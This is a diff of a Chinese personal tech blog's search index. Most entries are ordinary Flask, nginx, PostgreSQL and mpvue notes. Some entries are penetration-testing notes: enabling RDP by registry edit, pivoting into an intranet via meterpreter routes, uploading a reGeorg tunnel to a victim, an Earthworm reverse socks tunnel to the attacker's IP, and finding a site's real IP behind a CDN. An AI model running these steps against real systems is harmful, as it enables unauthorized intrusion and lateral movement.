@@ -1,9 +1,235 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[mpvue踩坑之旅]]></title>
-    <url>%2F2020%2F03%2F16%2Fmpvue%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85%2F</url>
-    <content type="text"><![CDATA[mpvue可以运行在小程序环境中，从而为小程序开发引入了整套 Vue.js 开发体验。http://mpvue.com/mpvue/ 引入sassnpm i -D sass-loader node-sass由于webpack版本太低，所以sass-loader的版本也得低一些，7，6都可 引入sass全局文件 npm install sass-loader node-sass --save-devnpm install sass-resources-loader --save-dev//修改mpvue的配置文件build/utils.jsreturn &#123; css: generateLoaders(), wxss: generateLoaders(), postcss: generateLoaders(), less: generateLoaders('less'), sass: generateLoaders('sass', &#123; indentedSyntax: true &#125;), //修改开始 scss: generateLoaders('sass').concat( &#123; loader: 'sass-resources-loader', options: &#123; resources: path.resolve(__dirname, '../src/global.scss') // 此路径就是你定义全局scss变量的路径，可随你自己的更改 &#125; &#125; ), //修改结束 stylus: generateLoaders('stylus'), styl: generateLoaders('stylus') &#125;&#125; 引入第三方微信小程序组件库 将组件库下载至static文件夹 在需要引入组件的页面新建配置文件main.json 配置usingComponents&#123; "usingComponents": &#123; "i-icon": "../../../static/ivew/icon/index" &#125;&#125; 监听组件的事件 mpvue对这些事件对象进行了包装，原本可以直接通过函数接收的event对象被包装到了mp属性中 mpvue不支持对vue的自定义组件绑定click 等原生事件，需要在组件内部自行emit事件 所有页面vue生命周期函数中的beforeCreate和created是一起执行的,可以使用mounted,beforeMount,onshow,onhide等代替]]></content>
+    <title> cmd开启3389		</title>
+    <url>/2018/07/29/cmd-e5-bc-80-e5-90-af3389/</url>
+    <content><![CDATA[<p>win2003<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' <span class="keyword">call</span> SetAllowTSConnections <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>win2003，xp<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> 内网渗透之进入内网		</title>
+    <url>/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/</url>
+    <content><![CDATA[<h3 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h3><p>拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网</p>
+<pre><code>meterpreter&gt;run get_local_subnets //获取子网/子网掩码
+
+添加路由
+meterpreter&gt;run autoroute -s 子网/子网掩码
+或
+msf&gt;route add 子网 子网掩码 seesion_id
+
+内网主机存活扫描
+meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+</code></pre><p>使nmap等工具也可以扫描内网</p>
+<pre><code>1.scoks4代理（支持tcp,sock5支持tcp/udp）
+use auxiliary/server/socks4a
+
+2.proxychains/proxifier等全局代理软件
+proxychains4 nmap -sT ip
+</code></pre><a id="more"></a>
+<h3 id="2-proxychains-proxifier-reGeorg"><a href="#2-proxychains-proxifier-reGeorg" class="headerlink" title="2.proxychains/proxifier+reGeorg"></a>2.proxychains/proxifier+reGeorg</h3><pre><code>1.上传tunnel脚本到靶机
+2.python reGeorgSocksProxy.py -u http://ip/tunnel //开启socks服务
+3.配置proxychains/proxifier使用socks服务
+</code></pre><h3 id="3-Earthworm-socks5代理"><a href="#3-Earthworm-socks5代理" class="headerlink" title="3.Earthworm(socks5代理)"></a>3.Earthworm(socks5代理)</h3><p>1.正向，在靶机开启socks服务</p>
+<pre><code>ew –s ssocksd –l 888
+</code></pre><p>2.反向</p>
+<pre><code>本机添加一个转接隧道，把1080端口收到的代理请求转交给888端口
+ew -s rcsocks -l 1008 -e 888
+
+在靶机上开启socks服务，并反弹到本机888端口上
+ew -s rssocks -d 本机ip -e 888
+
+接下来就可以配置全局代理软件访问本机1008端口使用靶机socks服务了
+</code></pre>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> 学校多个系统的命令行客户端		</title>
+    <url>/2018/09/16/e5-ad-a6-e6-a0-a1-e5-a4-9a-e4-b8-aa-e7-b3-bb-e7-bb-9f-e7-9a-84-e5-91-bd-e4-bb-a4-e8-a1-8c-e5-ae-a2-e6-88-b7-e7-ab-af/</url>
+    <content><![CDATA[<blockquote>
+<p>闲来无事,给学校多个系统写了个命令行客户端,目前可以进入教务网和sakai,对会话进行了缓存，各个系统之间切换非常快速便捷</p>
+</blockquote>
+<p><a href="https://github.com/taopeach1998/CQU" target="_blank" rel="noopener"><code>项目传送门</code></a></p>
+<h3 id="0x1环境"><a href="#0x1环境" class="headerlink" title="0x1环境"></a>0x1环境</h3><blockquote>
+<p>Pipfile,Pipfile.lock中可以看到所有依赖信息<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/taopeach1998/CQU.git </span><br><span class="line">pipenv --python 3 </span><br><span class="line">pipenv install </span><br><span class="line">pipenv shell </span><br><span class="line">python manage.py</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<a id="more"></a>
+<h3 id="0x2使用"><a href="#0x2使用" class="headerlink" title="0x2使用"></a>0x2使用</h3><blockquote>
+<p>当前教务网系统实现查成绩功能，sakai系统实现查看本学期课程未完成作业功能</p>
+</blockquote>
+<ul>
+<li>help可以查看当前可用命令</li>
+<li>help [命令] 可以查看命令使用方式</li>
+<li>可以在conf/config.ini 中手动配置账号密码，也可以使用cconfig 命令配置</li>
+<li>jww是教务网账号密码,com_login是统一认证登录账号密码</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/14069474-325da5a2928d3b1a.gif?imageMogr2/auto-orient/strip" alt></p>
+<h3 id="0x3插件"><a href="#0x3插件" class="headerlink" title="0x3插件"></a>0x3插件</h3><blockquote>
+<p>可以以插件的方式向现有的jww,sakai系统增加新的功能,只需要在plugin/sakai或者plugin/jww中添加文件即可</p>
+</blockquote>
+<p>一个例子</p>
+<pre><code class="python"><span class="string">'''</span>
+<span class="string">:desc:这是一个测试</span>
+<span class="string">:usage:</span>
+<span class="string">test</span>
+<span class="string">'''</span>
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(session,args)</span>:</span>
+    <span class="string">'''</span>
+<span class="string">    :param session: requests.Session对象,当前系统的会话</span>
+<span class="string">    :param args:一个列表</span>
+<span class="string">    '''</span>
+    print(<span class="string">'this is a test!'</span>)
+</code></pre>
+<ul>
+<li>文件名字就是插件名字</li>
+<li>:desc: 插件描述</li>
+<li>:usage: 插件使用方式</li>
+<li>run函数必须存在</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> flask+nginx+uwsgi配置		</title>
+    <url>/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/</url>
+    <content><![CDATA[<h3 id="uwsgi配置（-ini）"><a href="#uwsgi配置（-ini）" class="headerlink" title="uwsgi配置（.ini）"></a>uwsgi配置（.ini）</h3><pre><code>[uwsgi]
+socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock
+chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写
+wsgi-file = manage.py  #项目启动文件
+callable = app  #主应用名
+processes = 4   #开启进程数
+buffer-size = 65535
+master = true #允许uwsgi主进程
+plugins = python #解决python与uwsgi兼容问题
+#sudo apt-get install uwsgi-plugin-python
+uid=1000 #设置运行用户uid/用户名
+gid=1000 #用户组id
+disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中
+logto =uwsgi_web.log
+virtualenv＝/home/proj/virtualenv #python虚拟环境
+</code></pre><a id="more"></a>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><pre><code>server {
+    listen       1234;#web服务监听端口
+    server_name  0.0.0.0;#域名/ip
+    location / {
+        include      uwsgi_params;
+        uwsgi_pass   127.0.0.1:5001;#uwsgi监听的端口或者socket文件，unix:/tmp/uwsgi.sock,nginx需要有对文件的写权限
+    }
+}
+</code></pre>]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> 绕过CDN查找真实ip		</title>
+    <url>/2018/09/02/e7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip/</url>
+    <content><![CDATA[<blockquote>
+<p>可通过多地ping的方法，判断是否加了cdn</p>
+</blockquote>
+<ul>
+<li>内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。</li>
+<li>扫描测试文件，如phpinfo，test等</li>
+<li>子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip</li>
+<li>国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了</li>
+<li>域名的解析记录。通过在线网站（<a href="http://site.ip138.com）" target="_blank" rel="noopener">http://site.ip138.com）</a> ，查询域名的历史解析记录和当前解析记录</li>
+<li>app。目标网可能有自己的app，通过抓包可能获得到目标真实ip</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> linux postgresql 使用		</title>
+    <url>/2018/07/27/linux-postgresql-e4-bd-bf-e7-94-a8/</url>
+    <content><![CDATA[<blockquote>
+<p>正常情况下，安装完成后，PostgreSQL服务器会自动在本机的5432端口开启。 初次安装后，默认生成一个名为postgres的数据库和一个名为postgres的数据库用户同时还生成了一个名为postgres的Linux系统用户。</p>
+</blockquote>
+<h3 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h3><h5 id="1-使用postgresql控制台创建"><a href="#1-使用postgresql控制台创建" class="headerlink" title="1.使用postgresql控制台创建"></a>1.使用postgresql控制台创建</h5><p>切换到postgres用户</p>
+<pre><code>su postgres
+</code></pre><p>下一步，使用psql命令登录PostgreSQL控制台。</p>
+<pre><code>psql
+</code></pre><a id="more"></a>
+<p>这时相当于系统用户postgres以同名数据库用户的身份，登录同名数据库，这是不用输入密码的。 完整命令</p>
+<pre><code>psql -d 数据库名称 -U 用户名称 --password 密码
+</code></pre><p>使用\password命令，为postgres用户设置一个密码。</p>
+<pre><code>\password postgres
+</code></pre><p>创建数据库用户test，并设置密码。</p>
+<pre><code>CREATE USER test WITH PASSWORD &apos;password&apos;;
+</code></pre><p>创建用户数据库，这里为exampledb，并指定所有者为test。</p>
+<pre><code>CREATE DATABASE exampledb OWNER test;
+</code></pre><p>将exampledb数据库的所有权限都赋予test，否则test只能登录控制台，没有任何数据库操作权限。</p>
+<pre><code>GRANT ALL PRIVILEGES ON DATABASE exampledb to test;
+</code></pre><h5 id="2-使用shell命令行"><a href="#2-使用shell命令行" class="headerlink" title="2.使用shell命令行"></a>2.使用shell命令行</h5><p><code>PostgreSQL提供了命令行程序createuser和createdb。</code> 创建数据库用户test，并指定其为超级用户。</p>
+<pre><code>sudo -u postgres createuser --superuser test
+</code></pre><p>创建数据库exampledb</p>
+<pre><code>sudo -u postgres createdb -O dbuser exampledb
+</code></pre><h3 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2.删除数据库"></a>2.删除数据库</h3><p>命令行</p>
+<pre><code>sudo -u postgres dropdb test
+</code></pre><p>psql</p>
+<pre><code>sudo -u postgres psql
+DROP DATABASE test;
+</code></pre><h3 id="3-psql的一些命令"><a href="#3-psql的一些命令" class="headerlink" title="3.psql的一些命令"></a>3.psql的一些命令</h3><pre><code>\q:退出
+\password:设置密码
+\h：查看SQL命令的解释，比如\h select。
+\?：查看psql命令列表。
+\l：列出所有数据库。
+\c [database_name]：连接其他数据库。
+\d：列出当前数据库的所有表格。
+\d [table_name]：列出某一张表格的结构。
+\du：列出所有用户。
+\e：打开文本编辑器。
+\conninfo：列出当前数据库和连接的信息。
+</code></pre>]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>mpvue踩坑之旅</title>
+    <url>/2020/03/16/mpvue%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85/</url>
+    <content><![CDATA[<blockquote>
+<p>mpvue可以运行在小程序环境中，从而为小程序开发引入了整套 Vue.js 开发体验。<a href="http://mpvue.com/mpvue/" target="_blank" rel="noopener">http://mpvue.com/mpvue/</a></p>
+</blockquote>
+<ul>
+<li>引入sass<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i -D sass-loader node-sass</span><br><span class="line">由于webpack版本太低，所以sass-loader的版本也得低一些，<span class="number">7</span>，<span class="number">6</span>都可</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>引入sass全局文件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install sass-loader node-sass --save-dev</span><br><span class="line"></span><br><span class="line">npm install sass-resources-loader --save-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改mpvue的配置文件build/utils.js</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    css: generateLoaders(),</span><br><span class="line">    wxss: generateLoaders(),</span><br><span class="line">    postcss: generateLoaders(),</span><br><span class="line">    less: generateLoaders(<span class="string">'less'</span>),</span><br><span class="line">    sass: generateLoaders(<span class="string">'sass'</span>, &#123; <span class="attr">indentedSyntax</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">    <span class="comment">//修改开始</span></span><br><span class="line">    scss: generateLoaders(<span class="string">'sass'</span>).concat(</span><br><span class="line">      &#123;</span><br><span class="line">        loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          resources: path.resolve(__dirname, <span class="string">'../src/global.scss'</span>)</span><br><span class="line">          <span class="comment">// 此路径就是你定义全局scss变量的路径，可随你自己的更改</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="comment">//修改结束</span></span><br><span class="line">    stylus: generateLoaders(<span class="string">'stylus'</span>),</span><br><span class="line">    styl: generateLoaders(<span class="string">'stylus'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>引入第三方微信小程序组件库</p>
+</li>
+</ul>
+<ol>
+<li>将组件库下载至static文件夹</li>
+<li>在需要引入组件的页面新建配置文件main.json</li>
+<li>配置usingComponents<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"usingComponents"</span>: &#123;</span><br><span class="line">        <span class="string">"i-icon"</span>: <span class="string">"../../../static/ivew/icon/index"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>监听组件的事件</li>
+</ul>
+<ol>
+<li>mpvue对这些事件对象进行了包装，原本可以直接通过函数接收的event对象被包装到了mp属性中</li>
+<li>mpvue不支持对vue的自定义组件绑定click 等<code>原生事件</code>，需要在组件内部自行emit事件</li>
+</ol>
+<ul>
+<li>所有页面vue生命周期函数中的beforeCreate和created是一起执行的,可以使用mounted,beforeMount,onshow,onhide等代替</li>
+</ul>
+]]></content>
       <categories>
         <category>WEB前端/后端</category>
       </categories>
@@ -12,147 +238,429 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[webpack4打包原理]]></title>
-    <url>%2F2019%2F05%2F19%2Fwebpack4%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86%2F</url>
-    <content type="text"><![CDATA[本文webpack为4.31.0 //webpack.config.jsconst path = require('path');module.exports = &#123; mode:'development', entry: './src/index.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125;; //index.jsimport add from './utils';console.log(add(1,2)); //utils.jsfunction add(a,b)&#123; return a+b;&#125;export default add; 打包后的代码 //bundle.js/******/ (function(modules) &#123; // webpackBootstrap/******/ // The module cache/******/ var installedModules = &#123;&#125;;/******//******/ // The require function/******/ function __webpack_require__(moduleId) &#123;/******//******/ // Check if module is in cache/******/ if(installedModules[moduleId]) &#123;/******/ return installedModules[moduleId].exports;/******/ &#125;/******/ // Create a new module (and put it into the cache)/******/ var module = installedModules[moduleId] = &#123;/******/ i: moduleId,/******/ l: false,/******/ exports: &#123;&#125;/******/ &#125;;/******//******/ // Execute the module function/******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);/******//******/ // Flag the module as loaded/******/ module.l = true;/******//******/ // Return the exports of the module/******/ return module.exports;/******/ &#125;/******//******//******/ // expose the modules object (__webpack_modules__)/******/ __webpack_require__.m = modules;/******//******/ // expose the module cache/******/ __webpack_require__.c = installedModules;/******//******/ // define getter function for harmony exports/******/ __webpack_require__.d = function(exports, name, getter) &#123;/******/ if(!__webpack_require__.o(exports, name)) &#123;/******/ Object.defineProperty(exports, name, &#123; enumerable: true, get: getter &#125;);/******/ &#125;/******/ &#125;;/******//******/ // define __esModule on exports/******/ __webpack_require__.r = function(exports) &#123;/******/ if(typeof Symbol !== 'undefined' &amp;&amp; Symbol.toStringTag) &#123;/******/ Object.defineProperty(exports, Symbol.toStringTag, &#123; value: 'Module' &#125;);/******/ &#125;/******/ Object.defineProperty(exports, '__esModule', &#123; value: true &#125;);/******/ &#125;;/******//******/ // create a fake namespace object/******/ // mode &amp; 1: value is a module id, require it/******/ // mode &amp; 2: merge all properties of value into the ns/******/ // mode &amp; 4: return value when already ns object/******/ // mode &amp; 8|1: behave like require/******/ __webpack_require__.t = function(value, mode) &#123;/******/ if(mode &amp; 1) value = __webpack_require__(value);/******/ if(mode &amp; 8) return value;/******/ if((mode &amp; 4) &amp;&amp; typeof value === 'object' &amp;&amp; value &amp;&amp; value.__esModule) return value;/******/ var ns = Object.create(null);/******/ __webpack_require__.r(ns);/******/ Object.defineProperty(ns, 'default', &#123; enumerable: true, value: value &#125;);/******/ if(mode &amp; 2 &amp;&amp; typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) &#123; return value[key]; &#125;.bind(null, key));/******/ return ns;/******/ &#125;;/******//******/ // getDefaultExport function for compatibility with non-harmony modules/******/ __webpack_require__.n = function(module) &#123;/******/ var getter = module &amp;&amp; module.__esModule ?/******/ function getDefault() &#123; return module['default']; &#125; :/******/ function getModuleExports() &#123; return module; &#125;;/******/ __webpack_require__.d(getter, 'a', getter);/******/ return getter;/******/ &#125;;/******//******/ // Object.prototype.hasOwnProperty.call/******/ __webpack_require__.o = function(object, property) &#123; return Object.prototype.hasOwnProperty.call(object, property); &#125;;/******//******/ // __webpack_public_path__/******/ __webpack_require__.p = "";/******//******//******/ // Load entry module and return exports/******/ return __webpack_require__(__webpack_require__.s = "./src/index.js");/******/ &#125;)/************************************************************************//******/ (&#123;/***/ "./src/index.js":/*!**********************!*\ !*** ./src/index.js ***! \**********************//*! no exports provided *//***/ (function(module, __webpack_exports__, __webpack_require__) &#123;"use strict";eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./utils */ \"./src/utils.js\");\n\r\n\r\nconsole.log('hello webpack');\r\nconsole.log(Object(_utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"])(1,2));\n\n//# sourceURL=webpack:///./src/index.js?");/***/ &#125;),/***/ "./src/utils.js":/*!**********************!*\ !*** ./src/utils.js ***! \**********************//*! exports provided: default *//***/ (function(module, __webpack_exports__, __webpack_require__) &#123;"use strict";eval("__webpack_require__.r(__webpack_exports__);\nfunction add(a,b)&#123;\r\n return a+b;\r\n&#125;\r\n\r\n/* harmony default export */ __webpack_exports__[\"default\"] = (add);\n\n//# sourceURL=webpack:///./src/utils.js?");/***/ &#125;)/******/ &#125;); 可以看到整个文件是一个立即执行函数，参数是一个对象，对象属性名称是js文件的路径，属性值是一个函数，函数接受三个参数module，__webpack_exports__，__webpack_require__，函数内部的eval函数里面是js文件的源代码，但是把import变成了__webpack_require__()，export default变成了__webpack_exports__[&quot;default&quot;] __webpack_require__的定义在立即执行函数里面function __webpack_require__(moduleId) &#123;/******//******/ // Check if module is in cache/******/ if(installedModules[moduleId]) &#123;/******/ return installedModules[moduleId].exports;/******/ &#125;/******/ // Create a new module (and put it into the cache)/******/ var module = installedModules[moduleId] = &#123;/******/ i: moduleId,/******/ l: false,/******/ exports: &#123;&#125;/******/ &#125;;/******//******/ // Execute the module function/******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);/******//******/ // Flag the module as loaded/******/ module.l = true;/******//******/ // Return the exports of the module/******/ return module.exports;/******/ &#125; 可以看到定义了一个module对象，对象包含一个exports对象，通过moduleId(js文件路径)，获取到了被包装成函数的js文件，并传入了module, module.exports, __webpack_require__进行调用，巧妙的通过传入module.exports引用，将模块内部对外的接口附加在了module.exports上，函数最后返回了module.exports对象。 被包装成函数的index.js文件(我把eval函数去掉了，方便看些)function(module, __webpack_exports__, __webpack_require__) &#123;"use strict";__webpack_require__.r(__webpack_exports__);/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./src/utils.js");console.log('hello webpack');console.log(Object(_utils__WEBPACK_IMPORTED_MODULE_0__["default"])(1,2));//# sourceURL=webpack:///./src/index.js?;/***/ &#125; 通过__webpack_require__(&quot;./src/utils.js&quot;)导入，获取exports对象，然后通过_utils__WEBPACK_IMPORTED_MODULE_0__[&quot;default&quot;]调用接口(这是export default的调用方式，如果是export，default就变成具体的名字)。]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Nginx location规则]]></title>
-    <url>%2F2019%2F02%2F24%2Fnginx-location-e8-a7-84-e5-88-99%2F</url>
-    <content type="text"><![CDATA[官方文档:http://nginx.org/en/docs/http/ngx_http_core_module.html#location Syntax : location [ = | ~ | ~* | ^~ ] uri { ... } location @name { ... } Default: — Context: server, location =，^~，空，定义前缀字符串(普通location)(官网叫prefix locations) ~和~*(大小写不敏感)定义正则表达式（正则location） @定义一个命名的location，用于重定向 对于一个请求进行匹配，最先匹配普通location，并且最终(没有正则匹配前)的匹配结果为最长前缀匹配(从请求的开头开始，尽可能长的匹配) 接下来进行正则location匹配，根据在配置文件中的顺序，在第一次成功匹配时结束，并使用相应的配置，如果没有匹配，则用普通location的匹配结果 如果最大前缀匹配使用^~，则不进行后面的正则匹配 =表示精确匹配，一旦匹配，就结束 官网的例子 location = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* \.(gif|jpg|jpeg)$ { [ configuration E ] } &#39;/&#39;匹配A &#39;/index.html&#39;匹配B &#39;/documents/document.html&#39;匹配C &#39;/images/1.gif&#39;匹配D &#39;/documents/1.jpg&#39;匹配E]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Python3 生成器]]></title>
-    <url>%2F2019%2F02%2F24%2Fpython3-e7-94-9f-e6-88-90-e5-99-a8%2F</url>
-    <content type="text"><![CDATA[在 Python 中，使用了yield的函数被称为生成器（generator）。在通过__next__() 调用生成器时，会执行到下一个yield停止，返回 yield 的值，在下一次执行 __next__() 方法时从当前位置继续运行，没有下一个yield时抛出StopIteration的异常。生成器可以用for循环迭代。 1.列表生成式 将列表生成式的[]改成()，就创建了一个生成器 &gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x104feab40&gt; 2.函数 含有yield关键字的函数被认为是生成器。 斐波拉契数列： def fib(max): n, a, b = 0, 0, 1 while n < max: yield b a, b = b, a + b n = n + 1 3.___next__() and send() ___next__()，执行到下一个yield处，并返回值， send(val)，执行到下一个yield处，并返回值，val可以设置上一个yield表达式的返回值(m= yield 5)，yield 5这个表达式是没有返回值的，所以m=None，但是send(val)可以设置m=val，第一次运行next时在yield处返回，m没有被赋值，第二次执行send(val)时，从此处接着执行，设置m=val，并运行到下一个yield处 ___next__() == send(None) 生产者消费者问题：生产者生产-&gt;消费者消费-&gt;生产者生产… def consumer(): r = '' while True: n = yield r if not n: return print('[CONSUMER] Consuming %s...' % n) r = '200 OK' def produce(c): c.send(None) n = 0 while n < 5: n = n + 1 print('[PRODUCER] Producing %s...' % n) r = c.send(n) print('[PRODUCER] Consumer return: %s' % r) c.close() c = consumer() produce(c) 结果: [PRODUCER] Producing 1…[CONSUMER] Consuming 1…[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 2…[CONSUMER] Consuming 2…[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 3…[CONSUMER] Consuming 3…[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 4…[CONSUMER] Consuming 4…[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 5…[CONSUMER] Consuming 5…[PRODUCER] Consumer return: 200 OK]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Python3 MRO与super]]></title>
-    <url>%2F2019%2F02%2F19%2Fpython-mro-e4-b8-8esuper%2F</url>
-    <content type="text"><![CDATA[0x1 MRO 二义性问题：派生类与基类中存在名字相同的数据或函数，使得无法判断与调用。例如，有两个基类A和B，A和B都定义了方法f()，C继承A和B，那么调用C的f()方法时会出现不确定。 MRO：method resolution order（方法解释顺序），主要用于在多继承时判断属性(成员变量/方法)的搜索顺序，解决二义性问题。通过拓扑排序实现。可通过内置__mro__或者mro()查看类的mro列表。 拓扑排序：对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边(u,v)∈E(G)，则u在线性序列中出现在v之前。实现步骤：选择一个入度为0的顶点并输出；从图中删除此顶点及所有出边。 此为一个多重继承关系图，首先选入度为0的元素A,再删除从A出去的边，此时B，C都是入度为0，从左到右选择，所以选择B并删除B的边,再接着就是E,C,D,F,最后是object,所以A的MRO列表为[A,B,E,C,D,F,object] 0x2 super的两种调用方式 提供一个MRO以及一个MRO中的类C, super()将返回一个从MRO中C之后的类中查找方法的对象。 super(a_type, obj).func(),此时func是与obj绑定的,MRO 指的是 type(obj) 的 MRO, MRO 中的那个类就是 a_type , 同时 isinstance(obj, a_type) == True 。 super(type1, type2).func(),此时func未绑定,MRO 指的是 type2 的 MRO, MRO 中的那个类就是 type1 ，同时 issubclass(type2, type1) == True 。]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Supervisor]]></title>
-    <url>%2F2018%2F10%2F20%2Fsupervisor%2F</url>
-    <content type="text"><![CDATA[Supervisor是一个linux进程控制系统,让后台进程在会话结束的时候也照常运行，比如运行python flask应用 1.配置文件apt-get install supervisor安装完后，默认配置文件在/etc/supervisor/supervisord.conf echo_supervisord_conf 可以看到示例配置文件 [include] files = /etc/supervisor/conf.d/*.conf #该目录下增加我们自己的配置文件，在该配置文件中增加[program:x]部分，用来运行我们自己的程序 2.进程管理配置文件；/etc/supervisor/conf.d/test.conf [program:x] ;x是program名称 command =python test.py ;包含一个命令，当这个program启动时执行 directory = /home/si/ ;执行子进程时supervisord暂时切换到该目录 user = si ;用户 startsecs = 3 ;进程从STARING状态转换到RUNNING状态program所需要保持运行的时间 stdout_logfile_maxbytes = 50MB ;stdout_logfile指定日志文件最大字节数，默认为50MB，可以加KB、MB或GB等单位 stdout_logfile_backups = 10 ;要保存的stdout_logfile备份的数量 stdout_logfile = /home/si/1.log ;将进程stdout输出到指定文件 redirect_stderr=true ; 如果为true，则stderr的日志会被写入stdout日志文件中 numprocs=1 ; 启动进程的数目 autostart=true ; 如果是true的话，子进程将在supervisord启动后被自动启动 autorestart=unexpected ; 这个是设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected 和true。 如果为unexpected，只有当进程的退出码不在exitcodes里面定义的退 出码的时候，才会被自动重启。 exitcodes=0,2 startretries=3 ; 当进程启动失败后，最大尝试启动的次数 3.启动supervisord #启动supervisor服务端 #客户端 supervisorctl status #查看状态 supervisorctl reload #重新载入配置文件 supervisorctl start [all]|[name] #启动所有/指定的程序进程 supervisorctl stop [all]|[name] #关闭所有/指定的程序进程]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[学校多个系统的命令行客户端]]></title>
-    <url>%2F2018%2F09%2F16%2Fe5-ad-a6-e6-a0-a1-e5-a4-9a-e4-b8-aa-e7-b3-bb-e7-bb-9f-e7-9a-84-e5-91-bd-e4-bb-a4-e8-a1-8c-e5-ae-a2-e6-88-b7-e7-ab-af%2F</url>
